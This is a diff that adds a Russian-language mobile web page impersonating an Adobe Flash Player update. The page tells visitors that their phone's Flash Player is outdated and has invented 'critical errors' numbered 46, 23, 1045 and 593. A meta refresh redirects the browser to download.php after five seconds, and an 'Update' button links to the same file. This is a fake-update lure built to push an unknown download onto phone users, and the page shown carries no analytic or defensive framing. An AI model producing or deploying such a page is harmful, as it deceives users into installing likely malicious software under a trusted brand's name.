@@ -1,0 +1,57 @@
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>
+
+
+	.note {
+	color: #999999; font-size: 0.917em;
+	}
+
+
+	p {
+		    font-size: 1.083em;
+    
+	}
+	body {
+    color: #ffffff;
+    font: 75%/1 Arial,Helvetica,sans-serif;
+    background-image:url('./images/icon-02.png');
+    background-repeat:repeat-x;
+    background-position:top;
+	background-color:#353535;
+	}
+
+a.a:visited {
+color: #588CB8;
+}
+
+a {
+color: #047;
+text-decoration: none;
+}
+
+</style>
+<meta http-equiv="refresh" content="5;url=download.php">
+        <title>Adobe - Установить Adobe Flash Player</title>
+   
+</head>
+ 
+<body>
+    <table cellspacing="0" cellpadding="0">
+        <tbody><tr>
+            <td class="ico" valign="top">
+                <img src="./image/icon-05.png" alt="">
+               
+            </td>
+            <td style="padding-left:5px;">
+             <img src="./image/icon-08.png" alt="" width="200"><br>
+
+               <p>На вашем телефон установлен устаревшей Flash Player, который вероятно работает не корректно и содержит критические ошибки. Нажмите на кнопку "Обновить", для  установки новой версии. Процесс займет не более 1-2 минуты.</p>
+               <p class="note">Центр обновления установленных компонентов: Текущая версия Flash Player for телефон  содержит ошибки  №46, №23, №1045 и №593 рекомендуем обновить до новой версии.</p>
+               <a href="download.php" id="active"><img src="./image/icon-13.png"></a>
+<br clear="all">
+<br clear="all">
+            </td>
+        </tr>
+    </tbody></table>
+
+</body></html>
